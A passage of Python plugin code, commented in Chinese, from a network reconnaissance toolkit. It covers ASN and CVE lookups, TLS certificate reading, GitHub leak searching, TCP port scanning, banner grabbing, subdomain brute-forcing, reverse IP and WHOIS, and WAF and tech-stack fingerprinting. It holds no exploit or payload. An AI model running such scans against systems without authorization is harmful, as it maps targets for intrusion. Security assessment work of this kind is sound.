    if t not in ('device', 'domain', 'ip', 'cert', 'org'):
        t = 'device'
    raw = str(data)
    try:
        parsed = json.loads(raw)
    except Exception:
        parsed = None
    conn = self._rc_db()
    if not conn:
        return self._rc_fmt('store_save', {'error': '无法打开 recon.db'}, note='SQLite不可用')
    ts = time.time()
    conn.execute('INSERT INTO recon_records(type,data,ts) VALUES(?,?,?)', (t, raw, ts))
    conn.execute('INSERT INTO recon_events(type,data,ts) VALUES(?,?,?)',
                 ('save', json.dumps({'type': t, 'data': raw[:200]}, ensure_ascii=False), ts))
    conn.commit()
    rid = conn.execute('SELECT last_insert_rowid()').fetchone()[0]
    conn.close()
    return self._rc_fmt('store_save', {'id': rid, 'type': t, 'data': parsed if parsed is not None else raw},
                        note='已写入 plugins/recon.db')

# === from recon_wan_asn.plugin ===
def _recon_wan_asn(self, asn):
    import re, json, urllib.parse
    a = str(asn).strip().upper().lstrip('AS')
    a = re.sub(r'[^0-9]', '', a)
    if not a:
        return self._rc_fmt('wan_asn', {'error': '无效的ASN'}, note='需形如 AS13335 或 13335')
    # 1) RIPE stat
    try:
        url = 'https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS' + a
        st, txt, _h = self._rc_http(url, timeout=3)
        if st == 200 and txt:
            data = json.loads(txt)
            prefs = [p['prefix'] for p in data.get('data', {}).get('prefixes', [])]
            if prefs:
                return self._rc_fmt('wan_asn', {
                    'asn': 'AS' + a, 'prefixes': prefs, 'count': len(prefs), 'source': 'RIPE'
                }, note='ASN公告前缀')
    except Exception:
        pass
    # 2) hackertarget 兜底
    try:
        st, txt, _h = self._rc_http('https://api.hackertarget.com/asn/?q=AS' + a, timeout=3)
        if st == 200 and txt and 'error' not in txt.lower():
            lines = [l.strip() for l in txt.splitlines() if l.strip() and '/' in l]
            if lines:
                return self._rc_fmt('wan_asn', {
                    'asn': 'AS' + a, 'prefixes': lines, 'count': len(lines), 'source': 'hackertarget'
                }, note='ASN前缀(兜底源)')
    except Exception:
        pass
    return self._rc_fmt('wan_asn', {'asn': 'AS' + a, 'prefixes': [], 'count': 0},
                        note='RIPE/兜底源均无数据或超时')

# === from recon_wan_cert_detail.plugin ===
def _recon_wan_cert_detail(self, host, port=443, timeout_ms=3000):
    import ssl, socket
    try:
        to = max(0.5, min(timeout_ms / 1000.0, 4.0))
    except Exception:
        to = 3.0
    host = str(host).split('/')[0]

    def flat(d):
        out = {}
        for r in d:
            for k, v in r:
                out[k] = v
        return out

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        ss = ctx.wrap_socket(s, server_hostname=host)
        ss.connect((host, int(port)))
        cert = ss.getpeercert()
        ss.close()
    except Exception as e:
        return self._rc_fmt('wan_cert', {'host': host, 'error': str(e)},
                            note='TLS连接/证书读取失败')
    san = [v for t, v in cert.get('subjectAltName', []) if t == 'DNS']
    return self._rc_fmt('wan_cert', {
        'host': host, 'port': int(port),
        'subject': flat(cert.get('subject', [])),
        'issuer': flat(cert.get('issuer', [])),
        'san': san,
        'notBefore': cert.get('notBefore'),
        'notAfter': cert.get('notAfter'),
        'serial': cert.get('serialNumber'),
        'version': cert.get('version'),
    }, note='TLS证书详情(只读,不校验链)')

# === from recon_wan_cve_lookup.plugin ===
def _recon_wan_cve_lookup(self, product, version='', limit=20):
    import json, urllib.parse
    q = str(product).strip()
    if version:
        q += ' ' + str(version).strip()
    try:
        lim = max(5, min(int(limit), 50))
    except Exception:
        lim = 20
    url = ('https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch='
           + urllib.parse.quote(q) + '&resultsPerPage=' + str(lim))
    try:
        st, txt, _h = self._rc_http(url, timeout=3)
        if st != 200 or not txt:
            return self._rc_fmt('wan_cve', {'product': q, 'error': 'NVD 超时/不可达/限流(默认6次/秒)'},
                                note='外部API超时(阈值3s)')
        data = json.loads(txt)
        cves = []
        for v in data.get('vulnerabilities', [])[:lim]:
            c = v.get('cve', {})
            cid = c.get('id')
            desc = ''
            for d in c.get('descriptions', []):
                if d.get('lang') == 'en':
                    desc = d.get('value', '')
                    break
            sev = ''
            try:
                m = c['metrics']
                if 'cvssMetricV31' in m:
                    sev = m['cvssMetricV31'][0]['cvssData']['baseScore']
                elif 'cvssMetricV30' in m:
                    sev = m['cvssMetricV30'][0]['cvssData']['baseScore']
                elif 'cvssMetricV2' in m:
                    sev = m['cvssMetricV2'][0]['cvssData']['baseScore']
            except Exception:
                pass
            cves.append({'id': cid, 'severity': str(sev), 'description': desc[:240]})
        return self._rc_fmt('wan_cve', {'product': q, 'cves': cves, 'count': len(cves)},
                            note='NVD CVE(按关键字)')
    except Exception as e:
        return self._rc_fmt('wan_cve', {'product': q, 'error': str(e)}, note='解析失败/超时')

# === from recon_wan_favicon_hash.plugin ===
def _recon_wan_favicon_hash(self, url):
    import re

    def _murmur3_32(data, seed=0):
        c1 = 0xcc9e2d51
        c2 = 0x1b873593
        length = len(data)
        h = seed
        nblocks = length // 4
        for i in range(nblocks):
            k = int.from_bytes(data[i * 4:i * 4 + 4], 'little')
            k = (k * c1) & 0xffffffff
            k = (k << 15 | k >> 17) & 0xffffffff
            k = (k * c2) & 0xffffffff
            h ^= k
            h = (h << 13 | h >> 19) & 0xffffffff
            h = (h * 5 + 0xe6546b64) & 0xffffffff
        tail = length & 3
        k = 0
        for i in range(tail):
            k |= data[nblocks * 4 + i] << (i * 8)
        if k:
            k = (k * c1) & 0xffffffff
            k = (k << 15 | k >> 17) & 0xffffffff
            k = (k * c2) & 0xffffffff
            h ^= k
        h ^= length
        h = (h ^ h >> 16) & 0xffffffff
        h = (h * 0x85ebca6b) & 0xffffffff
        h = (h ^ h >> 13) & 0xffffffff
        h = (h * 0xc2b2ae35) & 0xffffffff
        h = (h ^ h >> 16) & 0xffffffff
        return h & 0xffffffff

    import hashlib, urllib.parse
    base = str(url).strip()
    if not base.startswith('http'):
        base = 'http://' + base
    parsed = urllib.parse.urlparse(base)
    icon_url = parsed.scheme + '://' + parsed.netloc + '/favicon.ico'
    st, data, _h = self._rc_http(icon_url, timeout=3)
    content = data.encode('utf-8', 'ignore') if isinstance(data, str) else data
    # 若 favicon.ico 失败,尝试从首页解析 <link icon>
    if st != 200 or len(content) < 16:
        st2, html, _h2 = self._rc_http(base, timeout=3)
        m = re.search(r'<link[^>]+rel=["\'][^"\']*icon[^"\']*["\'][^>]+href=["\']([^"\']+)["\']', html, re.I)
        if not m:
            m = re.search(r'<link[^>]+href=["\']([^"\']+)["\'][^>]+rel=["\'][^"\']*icon', html, re.I)
        if m:
            href = m.group(1)
            if href.startswith('//'):
                icon_url = parsed.scheme + ':' + href
            elif href.startswith('/'):
                icon_url = parsed.scheme + '://' + parsed.netloc + href
            else:
                icon_url = parsed.scheme + '://' + parsed.netloc + '/' + href
            st, data, _h = self._rc_http(icon_url, timeout=3)
            content = data.encode('utf-8', 'ignore') if isinstance(data, str) else data
    if st != 200 or len(content) < 16:
        return self._rc_fmt('wan_favicon', {'url': base, 'icon_url': icon_url, 'error': 'favicon 不可达'},
                            note='未能获取图标')
    md5 = hashlib.md5(content).hexdigest()
    mmh3 = _murmur3_32(content)
    return self._rc_fmt('wan_favicon', {
        'url': base, 'icon_url': icon_url, 'md5': md5, 'mmh3': mmh3
    }, note='MD5+MurmurHash3(Shodan兼容)')

# === from recon_wan_github_leak.plugin ===
def _recon_wan_github_leak(self, domain, limit=20):
    import json, urllib.parse
    d = str(domain).strip().lower()
    try:
        lim = max(5, min(int(limit), 30))
    except Exception:
        lim = 20
    headers = {'Accept': 'application/vnd.github+json', 'User-Agent': 'recon/1.0'}
    # 1) 代码搜索
    url = 'https://api.github.com/search/code?q=' + urllib.parse.quote(d) + '&per_page=' + str(lim)
    st, txt, _h = self._rc_http(url, timeout=3, headers=headers)
    if st == 200 and txt:
        try:
            data = json.loads(txt)
            items = data.get('items', [])[:lim]
            res = [{'repo': i.get('repository', {}).get('full_name'), 'path': i.get('path'),
                   'url': i.get('html_url')} for i in items]
            return self._rc_fmt('wan_gh_leak', {
                'domain': d, 'mode': 'code-search', 'items': res, 'count': len(res)
            }, note='GitHub公开代码检索(需令牌以避免403)')
        except Exception:
            pass
    # 2) 仓库名搜索兜底
    url2 = 'https://api.github.com/search/repositories?q=' + urllib.parse.quote(d) + '&per_page=' + str(lim)
    st2, txt2, _h2 = self._rc_http(url2, timeout=3, headers=headers)
    if st2 == 200 and txt2:
        try:
            data = json.loads(txt2)
            items = data.get('items', [])[:lim]
            res = [{'repo': i.get('full_name'), 'url': i.get('html_url'),
                   'desc': (i.get('description') or '')[:120]} for i in items]
            return self._rc_fmt('wan_gh_leak', {
                'domain': d, 'mode': 'repo-search', 'items': res, 'count': len(res)
            }, note='代码搜索不可用时降级为仓库名搜索')
        except Exception:
            pass
    return self._rc_fmt('wan_gh_leak', {'domain': d, 'items': [], 'count': 0},
                        note='GitHub代码搜索通常需API令牌(403); 请配置令牌或仅用于授权自查')

# === from recon_wan_port_scan.plugin ===
def _recon_wan_port_scan(self, ip, ports='', timeout_ms=1000, max_workers=32):
    import socket, concurrent.futures as cf, time
    host = str(ip).split('/')[0]
    PORT_SVC = {21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP',
                110: 'POP3', 111: 'RPC', 135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP',
                443: 'HTTPS', 445: 'SMB', 465: 'SMTPS', 587: 'SMTP', 993: 'IMAPS',
                995: 'POP3S', 1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP',
                5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis', 7001: 'WebLogic',
                8000: 'HTTP-Alt', 8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 8888: 'HTTP',
                9000: 'HTTP', 9090: 'HTTP', 9200: 'Elasticsearch', 11211: 'Memcached',
                27017: 'MongoDB', 50070: 'Hadoop', 53: 'DNS'}
    default = [21, 22, 23, 25, 53, 80, 81, 110, 111, 135, 139, 143, 443, 445, 465, 587,
               993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 7001, 8000, 8080, 8443,
               8888, 9000, 9090, 9200, 11211, 27017, 50070]
    try:
        to = max(0.1, min(timeout_ms / 1000.0, 2.0))
    except Exception:
        to = 1.0
    # 解析端口
    plist = default
    if ports:
        try:
            if isinstance(ports, (list, tuple)):
                plist = [int(x) for x in ports]
            else:
                s = str(ports).strip()
                if s.startswith('['):
                    import json
                    plist = [int(x) for x in json.loads(s)]
                else:
                    plist = [int(x.strip()) for x in s.replace('，', ',').split(',') if x.strip()]
        except Exception:
            plist = default
    plist = sorted(set(plist))[:200]
    mw = max(1, min(int(max_workers), 64))

    def probe(p):
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(to)
            c.connect((host, p))
            c.close()
            return p
        except Exception:
            return None

    open_ports = []
    with cf.ThreadPoolExecutor(max_workers=mw) as ex:
        for r in ex.map(probe, plist):
            if r is not None:
                open_ports.append({'port': r, 'service': PORT_SVC.get(r, 'unknown')})
    return self._rc_fmt('wan_port_scan', {
        'target': host, 'scanned': len(plist), 'open': open_ports, 'count': len(open_ports)
    }, note='主动端口扫描(并发%d,限速瞬时)' % mw)

# === from recon_wan_reverse_ip.plugin ===
def _recon_wan_reverse_ip(self, ip):
    ip = str(ip).strip()
    sources = [
        ('hackertarget', 'https://api.hackertarget.com/reverseiplookup/?q=' + ip),
        ('viewdns', 'https://viewdns.info/reverseip/?host=' + ip + '&output=text'),
    ]
    for name, url in sources:
        try:
            st, txt, _h = self._rc_http(url, timeout=3)
            if st != 200 or not txt:
                continue
            lines = [l.strip() for l in txt.splitlines() if l.strip()
                     and not l.lower().startswith('error') and '.' in l]
            if lines:
                return self._rc_fmt('wan_reverse_ip', {
                    'ip': ip, 'domains': lines, 'count': len(lines), 'source': name
                }, note='公共反向IP数据源')
        except Exception:
            continue
    return self._rc_fmt('wan_reverse_ip', {'ip': ip, 'domains': [], 'count': 0},
                        note='公共源无数据/超时; 可接入API密钥提升覆盖')

# === from recon_wan_reverse_whois.plugin ===
def _recon_wan_reverse_whois(self, registrant):
    import re, urllib.parse
    reg = str(registrant).strip()
    url = 'https://viewdns.info/reversewhois/?q=' + urllib.parse.quote(reg)
    try:
        st, txt, _h = self._rc_http(url, timeout=3)
        if st != 200 or not txt:
            return self._rc_fmt('wan_reverse_whois', {'registrant': reg, 'domains': [], 'count': 0},
                                note='免费源(viewdns)超时/不可用; 建议接入WhoisXML等API密钥')
        # 提取表格中的域名（出现频率高的 .com/.net 等）
        domains = re.findall(r'([a-zA-Z0-9\-]+\.[a-zA-Z]{2,24}(?:\.[a-zA-Z]{2,})?)', txt)
        seen, out = set(), []
        for d in domains:
            if d.lower() not in seen and '.' in d and len(d) > 4:
                seen.add(d.lower())
                out.append(d)
        # 过滤明显的非域名噪声（保留出现于表格行者）
        out = out[:200]
        return self._rc_fmt('wan_reverse_whois', {
            'registrant': reg, 'domains': out, 'count': len(out), 'source': 'viewdns'
        }, note='免费源启发式提取; 覆盖有限')
    except Exception as e:
        return self._rc_fmt('wan_reverse_whois', {'registrant': reg, 'error': str(e)},
                            note='查询失败')

# === from recon_wan_service_banner.plugin ===
def _recon_wan_service_banner(self, ip, port, timeout_ms=2000):
    import socket, re
    try:
        to = max(0.2, min(timeout_ms / 1000.0, 3.0))
    except Exception:
        to = 2.0
    host = str(ip).split('/')[0]
    p = int(port)
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.settimeout(to)
    banner = ''
    try:
        c.connect((host, p))
        if p in (80, 443, 8080, 8000, 8443):
            c.sendall(('GET / HTTP/1.0\r\nHost: %s\r\nUser-Agent: recon\r\n\r\n' % host).encode())
        else:
            c.sendall(b'\r\n')
        try:
            banner = c.recv(1024).decode('latin-1', 'ignore')
        except Exception:
            banner = ''
    except Exception as e:
        c.close()
        return self._rc_fmt('wan_svc_banner', {'target': host, 'port': p, 'open': False, 'error': str(e)},
                            note='连接失败/超时')
    c.close()
    banner = banner[:500]
    low = banner.lower()
    svc, ver = 'unknown', ''
    if 'ssh' in low:
        svc = 'SSH'; m = re.search(r'SSH[^\r\n]*?([\d.]+)', banner); ver = m.group(1) if m else ''
    elif '220 ' in banner and ('ftp' in low or 'filezilla' in low or 'vsftpd' in low):
        svc = 'FTP'
    elif '220 ' in banner and ('esmtp' in low or 'postfix' in low or 'sendmail' in low):
        svc = 'SMTP'
    elif '+ok ' in low or 'pop3' in low:
        svc = 'POP3'
    elif '* ok ' in low or 'imap' in low:
        svc = 'IMAP'
    elif 'mysql' in low:
        svc = 'MySQL'
    elif 'postgresql' in low:
        svc = 'PostgreSQL'
    elif 'redis' in low:
        svc = 'Redis'
    elif 'mongodb' in low:
        svc = 'MongoDB'
    elif 'http' in low or p in (80, 443, 8080, 8000, 8443):
        svc = 'HTTP' if p not in (443, 8443) else 'HTTPS'
    else:
        svc = {21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 110: 'POP3', 143: 'IMAP',
               443: 'HTTPS', 445: 'SMB', 3306: 'MySQL', 5432: 'PostgreSQL', 6379: 'Redis',
               27017: 'MongoDB', 3389: 'RDP', 5900: 'VNC'}.get(p, 'unknown')
    m = re.search(r'(?:Server|HTTPServer|X-Powered-By)[^\r\n:]*?:\s*([^\r\n]+)', banner)
    if m and not ver:
        ver = m.group(1).strip()[:80]
    return self._rc_fmt('wan_svc_banner', {
        'target': host, 'port': p, 'open': True, 'service': svc, 'version': ver, 'banner': banner
    }, note='单连接只读banner')

# === from recon_wan_shared_infra.plugin ===
def _recon_wan_shared_infra(self, targets, limit=10):
    import socket, re
    try:
        lim = max(2, min(int(limit), 30))
    except Exception:
        lim = 10
    tlist = [t.strip() for t in str(targets).split(',') if t.strip()][:lim]
    ip_map = {}
    for t in tlist:
        try:
            if re.match(r'\d{1,3}(\.\d{1,3}){3}$', t):
                ip_map.setdefault(t, set()).add(t)
            else:
                try:
                    _, _, ips = socket.gethostbyname_ex(t)
                except Exception:
                    try:
                        ips = [socket.gethostbyname(t)]
                    except Exception:
                        ips = []
                for ip in ips:
                    ip_map.setdefault(ip, set()).add(t)
        except Exception:
            continue
    shared = [{'ip': ip, 'domains': sorted(d)} for ip, d in ip_map.items() if len(d) > 1]
    return self._rc_fmt('wan_shared_infra', {
        'targets': tlist,
        'ip_map': {ip: sorted(d) for ip, d in ip_map.items()},
        'shared_hosting': shared,
        'count': len(shared),
    }, note='基于DNS解析的IP共置; 进一步可用recon_wan_reverse_ip扩展')

# === from recon_wan_snapshot.plugin ===
def _recon_wan_snapshot(self, target, deep=False):
    import concurrent.futures as cf, re, urllib.parse
    t = str(target).strip()
    host = t
    if t.startswith('http'):
        host = urllib.parse.urlparse(t).netloc
    is_ip = bool(re.match(r'\d{1,3}(\.\d{1,3}){3}$', host))
    is_domain = ('.' in host) and not is_ip
    tasks = {
        'web_fp': lambda: self._recon_wan_web_fingerprint(url=t if t.startswith('http') else 'http://' + host),
        'port_scan': lambda: self._recon_wan_port_scan(ip=host),
        'cert': lambda: self._recon_wan_cert_detail(host=host),
    }
    if is_domain:
        tasks['sub_ct'] = lambda: self._recon_wan_subdomain_ct(domain=host)
        if deep:
            tasks['sub_brute'] = lambda: self._recon_wan_subdomain_brute(domain=host)
    res = {}
    with cf.ThreadPoolExecutor(max_workers=6) as ex:
        futs = {ex.submit(fn): name for name, fn in tasks.items()}
        for f in cf.as_completed(futs):
            name = futs[f]
            try:
                res[name] = f.result()
            except Exception as e:
                res[name] = '[RECON %s ERROR %s]' % (name, e)
    sections = '\n'.join('── %s ──\n%s' % (k, res[k]) for k in tasks)
    return self._rc_fmt('wan_snapshot', {'target': t, 'sections': list(tasks.keys()), 'count': len(tasks)},
                        note='并发聚合(≤5s)') + '\n' + sections

# === from recon_wan_subdomain_brute.plugin ===
def _recon_wan_subdomain_brute(self, domain, max_queries=200, rate=20):
    import socket, concurrent.futures as cf, time
    # 字典内置为局部常量,避免依赖模块级全局(银逝 exec 作用域限制)
    _COMMON_SUBS = ("www mail ftp ssh admin api dev test staging portal blog shop store"
        "web app mobile m api2 cdn img images static files docs wiki ns1 ns2 ns3 ns4"
        "mx mx1 mx2 smtp pop imap vpn ssl vpn1 remote gateway firewall router switch"
        "db database sql mongo redis cache memcache git gitlab jenkins ci cd nexus"
        "jira confluence bitbucket svn ldap ad sso oauth auth login owa exchange"
        "intranet internal extranet partner customer support help desk ticketing"
        "pay payments billing order checkout cart account my user profile search"
        "api-gateway gw services micro api-v1 api-v2 graphql rpc metrics monitor"
        "grafana kibana elk log logs elastic prometheus alert status health"
        "backup back storage nas san fileshare share sharepoint ws ws1 ws2"
        "mssql mysql oracle postgres pg sqlserver lb balancer proxy reverse"
        "node1 node2 node3 host1 host2 host3 server1 server2 server3 s1 s2 s3"
        "cloud aws azure gcp k8s kube docker registry harbor vault secrets"
        "beta alpha demo sandbox preprod prod production development qa uat"
        "corp company hr finance legal marketing sales ops it security iam").split()
    domain = str(domain).strip().lower().split('/')[0]
    try:
        mq = max(10, min(int(max_queries), 500))
    except Exception:
        mq = 200
    subs = list(_COMMON_SUBS)[:mq]
    found = []
    deadline = time.time() + 2.4  # 时间预算,保证瞬时

    def resolve(name):
        try:
            socket.gethostbyname(name + '.' + domain)
            return name
        except Exception:
            return None

    with cf.ThreadPoolExecutor(max_workers=40) as ex:
        futs = {ex.submit(resolve, s): s for s in subs}
        for f in cf.as_completed(futs):
            if time.time() > deadline:
                break
            r = f.result()
            if r:
                found.append(r + '.' + domain)
    return self._rc_fmt('wan_sub_brute', {
        'domain': domain,
        'tested': len(subs),
        'found': found,
        'count': len(found),
    }, note='DNS字典爆破(并发+时间预算≤2.4s,速率提示%d/s)' % int(rate))

# === from recon_wan_subdomain_ct.plugin ===
def _recon_wan_subdomain_ct(self, domain, limit=200):
    import json, re, urllib.parse
    domain = str(domain).strip().lower()
    if domain.startswith('http'):
        domain = urllib.parse.urlparse(domain).netloc
    domain = domain.split('/')[0]
    try:
        lim = max(10, min(int(limit), 500))
    except Exception:
        lim = 200
    url = 'https://crt.sh/?q=' + urllib.parse.quote('%.' + domain) + '&output=json'
    try:
        st, txt, _h = self._rc_http(url, timeout=3)
        if st != 200 or not txt:
            return self._rc_fmt('wan_sub_ct', {'domain': domain, 'error': 'crt.sh 超时/不可达/被限流'},
                                note='外部API超时(阈值3s)')
        data = json.loads(txt)
        seen = set()
        subs = []
        for e in data:
            nv = e.get('name_value', '')
            for sub in nv.split('\n'):
                sub = sub.strip().lower()
                if sub and '*' not in sub and sub.endswith(domain):
                    if sub not in seen:
                        seen.add(sub)
                        subs.append(sub)
            if len(subs) >= lim:
                break
        return self._rc_fmt('wan_sub_ct', {
            'domain': domain, 'subdomains': subs[:lim], 'count': len(subs[:lim])
        }, note='crt.sh 证书透明度(历史+当前)')
    except Exception as e:
        return self._rc_fmt('wan_sub_ct', {'domain': domain, 'error': str(e)},
                            note='解析失败/超时')

# === from recon_wan_tech_stack.plugin ===
def _recon_wan_tech_stack(self, url):
    import re
    u = str(url).strip()
    if not u.startswith('http'):
        u = 'http://' + u
    try:
        st, html, hdrs = self._rc_http(u, timeout=3)
    except Exception as e:
        return self._rc_fmt('wan_tech', {'url': u, 'error': str(e)}, note='请求失败')
    h = {k.lower(): v for k, v in (hdrs or {}).items()}
    b = html.lower()
    hblob = ' '.join((hdrs or {}).values()).lower()
    ck = h.get('set-cookie', '').lower()
    stack = {'webserver': set(), 'language': set(), 'framework': set(), 'cms': set(),
             'frontend': set(), 'js_libs': set(), 'cdn': set(), 'analytics': set(), 'waf': set()}

    if 'server' in h:
        stack['webserver'].add(h['server'])
    if 'x-powered-by' in h:
        stack['language'].add(h['x-powered-by'])
    if 'x-aspnet-version' in h:
        stack['framework'].add('ASP.NET ' + h['x-aspnet-version'])
    # language from cookies
    if 'phpsessid' in ck:
        stack['language'].add('PHP')
    if 'jsessionid' in ck:
        stack['language'].add('Java/JSP')
    if 'asp.net_sessionid' in ck:
        stack['language'].add('ASP.NET')
    # WAF
    waf = {'cloudflare': 'Cloudflare', 'cf-ray': 'Cloudflare', 'akamaighost': 'Akamai',
           'akamai': 'Akamai', 'awselb': 'AWS ELB/ALB', 'cloudfront': 'CloudFront',
           'incap_ses': 'Incapsula', 'sucuri': 'Sucuri', 'bigipserver': 'F5 BIG-IP',
           'mod_security': 'ModSecurity'}
    for k, v in waf.items():
        if k in hblob:
            stack['waf'].add(v)
    # CMS
    cms = {'wp-content': 'WordPress', 'wp-includes': 'WordPress', 'wordpress': 'WordPress',
           '/sites/default/files': 'Drupal', 'drupal': 'Drupal', 'joomla': 'Joomla',
           'magento': 'Magento', 'shopify': 'Shopify', 'squarespace': 'Squarespace',
           'typo3': 'TYPO3', 'discuz': 'Discuz'}
    for k, v in cms.items():
        if k in b:
            stack['cms'].add(v)
    if 'wordpress' in ck or 'wp-' in ck:
        stack['cms'].add('WordPress')
    # backend framework
    fw = {'laravel': 'Laravel', 'django': 'Django', 'rails': 'Ruby on Rails',
          'spring': 'Spring', 'flask': 'Flask', 'express': 'Express', 'gin': 'Gin', 'echo': 'Echo'}
    for k, v in fw.items():
        if k in b or k in hblob:
            stack['framework'].add(v)
    # frontend framework
    fe = {'react': 'React', 'vue': 'Vue.js', 'angular': 'Angular', 'next.js': 'Next.js',
          'nuxt': 'Nuxt', 'svelte': 'Svelte', '__next': 'Next.js', 'remix': 'Remix',
          'ember': 'Ember'}
    for k, v in fe.items():
        if k in b:
            stack['frontend'].add(v)
    # JS libs with version
    for lib, pat in {'jQuery': r'jquery[.\-](\d+\.\d+\.\d+)', 'Bootstrap': r'bootstrap[.\-](\d+\.\d+\.\d+)',
                     'Vue': r'vue[.\-](\d+\.\d+\.\d+)', 'Angular': r'angular[.\-](\d+\.\d+\.\d+)',
                     'D3': r'd3[.\-](\d+\.\d+\.\d+)', 'Lodash': r'lodash[.\-](\d+\.\d+\.\d+)',
                     'Moment': r'moment[.\-](\d+\.\d+\.\d+)'}.items():
        m = re.search(pat, b)
        if m:
            stack['js_libs'].add(lib + ' ' + m.group(1))
        elif lib.lower() in b:
            stack['js_libs'].add(lib)
    # CDN
    cdn = {'cloudfront': 'CloudFront', 'cloudflare': 'Cloudflare', 'akamai': 'Akamai',
           'jsdelivr': 'jsDelivr', 'unpkg': 'unpkg', 'cdnjs': 'cdnjs', 'googleapis': 'Google',
           'bootstrapcdn': 'BootstrapCDN', 'alicdn': 'AliCDN', 'bdimg': 'BaiduCDN'}
    for k, v in cdn.items():
        if k in b or k in hblob:
            stack['cdn'].add(v)
    # analytics
    an = {'google-analytics': 'Google Analytics', 'gtag': 'Google Tag Manager',
          'googletagmanager': 'Google Tag Manager', 'baidu': 'Baidu Tongji', 'matomo': 'Matomo',
          'yandex': 'Yandex Metrica', 'hotjar': 'Hotjar', 'mixpanel': 'Mixpanel',
          'segment': 'Segment', 'amplitude': 'Amplitude'}
    for k, v in an.items():
        if k in b or k in hblob:
            stack['analytics'].add(v)
    out = {k: sorted(v) for k, v in stack.items() if v}
    return self._rc_fmt('wan_tech', {'url': u, 'status': st, 'tech_stack': out},
                        note='技术栈研判(单次GET; 缺类=未检出)')

# === from recon_wan_web_fingerprint.plugin ===
def _recon_wan_web_fingerprint(self, url, timeout_ms=3000):
    import re
    try:
        to = max(0.5, min(timeout_ms / 1000.0, 4.0))
    except Exception:
        to = 3.0
    u = str(url).strip()
    if not u.startswith('http'):
        u = 'http://' + u
    try:
        st, html, hdrs = self._rc_http(u, timeout=to)
    except Exception as e:
        return self._rc_fmt('wan_web_fp', {'url': u, 'error': str(e)}, note='请求失败')
    h = {k.lower(): v for k, v in (hdrs or {}).items()}
    b = html.lower()
    hblob = ' '.join((hdrs or {}).values()).lower()
    findings = []

    def add(cat, val):
        if val and (cat, val) not in findings:
            findings.append((cat, val))

    if 'server' in h:
        add('webserver', h['server'])
    if 'x-powered-by' in h:
        add('language/framework', h['x-powered-by'])
    if 'x-aspnet-version' in h:
        add('framework', 'ASP.NET ' + h['x-aspnet-version'])
    if 'x-generator' in h:
        add('generator', h['x-generator'])
    # WAF
    waf = {'cloudflare': 'Cloudflare', 'cf-ray': 'Cloudflare', '__cfduid': 'Cloudflare',
           'akamaighost': 'Akamai', 'akamai': 'Akamai', 'x-akamai': 'Akamai',
           'awselb': 'AWS ELB/ALB', 'cloudfront': 'CloudFront', 'x-amz': 'AWS',
           'incap_ses': 'Incapsula', 'visid_incap': 'Incapsula', 'sucuri': 'Sucuri',
           'x-sucuri': 'Sucuri', 'bigipserver': 'F5 BIG-IP', 'big-ip': 'F5 BIG-IP',
           'mod_security': 'ModSecurity', 'wordfence': 'Wordfence'}
    for k, v in waf.items():
        if k in hblob:
            add('waf', v)
    # CMS
    cms = {'wp-content': 'WordPress', 'wp-includes': 'WordPress', 'wordpress': 'WordPress',
           '/sites/default/files': 'Drupal', 'drupal': 'Drupal', 'joomla': 'Joomla',
           'vbulletin': 'vBulletin', 'discuz': 'Discuz', 'phpwind': 'PHPWind',
           'shopify': 'Shopify', 'squarespace': 'Squarespace', 'wix.com': 'Wix',
           'weebly': 'Weebly', 'magento': 'Magento', 'typo3': 'TYPO3'}
    for k, v in cms.items():
        if k in b:
            add('cms', v)
    m = re.search(r'<meta name=["\']generator["\'][^>]+content=["\']([^"\']+)', html, re.I)
    if m:
        add('generator', m.group(1))
    # framework
    fw = {'laravel': 'Laravel', 'django': 'Django', 'rails': 'Ruby on Rails',
          'spring': 'Spring', 'next.js': 'Next.js', 'nuxt': 'Nuxt', 'angular': 'Angular',
          'react': 'React', 'vue': 'Vue.js', 'jquery': 'jQuery', 'bootstrap': 'Bootstrap',
          'tailwind': 'Tailwind CSS', '__next': 'Next.js', 'remix': 'Remix'}
    for k, v in fw.items():
        if k in b:
            add('framework', v)
    # cookies
    ck = h.get('set-cookie', '').lower()
    if 'wordpress' in ck or 'wp-' in ck:
        add('cms', 'WordPress(cookie)')
    if 'phpsessid' in ck:
        add('language', 'PHP')
    if 'jsessionid' in ck:
        add('language', 'Java/JSP')
    if 'asp.net_sessionid' in ck or 'asp' in ck:
        add('language', 'ASP.NET')
    return self._rc_fmt('wan_web_fp', {
        'url': u, 'status': st,
        'findings': [{'category': c, 'value': v} for c, v in findings],
    }, note='Web指纹(单次GET; 缺项=未检出)')

# === from regex_tester.plugin ===
def _regex_tester(self, pattern: str, text: str, replacement: str = '', flags: str = '', fullmatch: bool = False) -> str:
    """re 标准库：多 flag、命名组、span 表、替换预览、整串匹配选项。"""
    import os, re

    if os.path.isfile(text):
        with open(text, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read(100000)

    fl = 0
    flabel = []
    for ch in flags:
        if ch == 'i':
            fl |= re.I; flabel.append('IGNORECASE')
        elif ch == 'm':
            fl |= re.M; flabel.append('MULTILINE')
        elif ch == 's':
            fl |= re.S; flabel.append('DOTALL')
        elif ch == 'x':
            fl |= re.X; flabel.append('VERBOSE')
    try:
        rx = re.compile(pattern, fl)
    except re.error as e:
        return "✗ 正则语法错误: %s" % e

    if fullmatch:
        m0 = rx.fullmatch(text)
        matches = [m0] if m0 else []
    else:
        matches = list(rx.finditer(text))

    out = ["[REGEX] 模式: %s" % pattern,
           "标志: %s" % (', '.join(flabel) if flabel else '无'),
           "匹配数: %d%s" % (len(matches), ' (fullmatch)' if fullmatch else '')]
    if not matches:
        out.append("结果: 未找到匹配")
        return '\n'.join(out)

    named = [g for g in matches[0].groupdict() if matches[0].groupdict()[g] is not None]
    if named:
